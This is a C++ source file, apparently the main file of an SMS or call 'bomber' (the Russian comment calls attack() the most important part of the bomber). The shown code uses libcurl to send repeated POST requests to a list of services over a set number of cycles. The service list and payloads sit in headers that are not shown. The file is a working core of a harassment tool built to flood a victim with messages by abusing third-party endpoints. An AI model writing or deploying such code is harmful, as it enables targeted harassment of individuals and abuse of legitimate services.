#include "libs.hpp"

#include "build/build.hpp"

void attack(int cycles); //Прототип функции
#include "src/functions.hpp"
#include "src/services.hpp"
#include "src/screens.hpp"

int main(void)
{
    screenSelecting();

    return 0;    
}

//Самый главный кусок бомбера
void attack(int cycles)
{
    CURL *curl;
    CURLcode res;

    curl_global_init(CURL_GLOBAL_ALL);

    curl = curl_easy_init();
    if(curl)
    {
        initServices();
        cout << "Всего сервисов: " << sizeof(Services)/sizeof(Services[0]) << endl;
        for(int i=0; i<cycles; i++)
        {
            cout << "Текущий круг: " << i+1 << DOUBLE_ENDL;

            for(int i=0; i<sizeof(Services)/sizeof(Services[0]); i++)
            {
                cout << "Текущий сервис: " << Services[i].name << endl;

                curl_easy_setopt(curl, CURLOPT_URL, Services[i].url.c_str());
                //curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
                curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
                //curl_easy_setopt(curl, CURLOPT_USERAGENT, userAgent.c_str());
                curl_easy_setopt(curl, CURLOPT_POST, 1L);
                curl_easy_setopt(curl, CURLOPT_POSTFIELDS, Services[i].data.c_str());

                res = curl_easy_perform(curl);
                if(res != CURLE_OK){cout << "Ошибка в curl_easy_perform(): " << curl_easy_strerror(res) << endl;}
                cout << DOUBLE_ENDL;
            }
        }
        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
}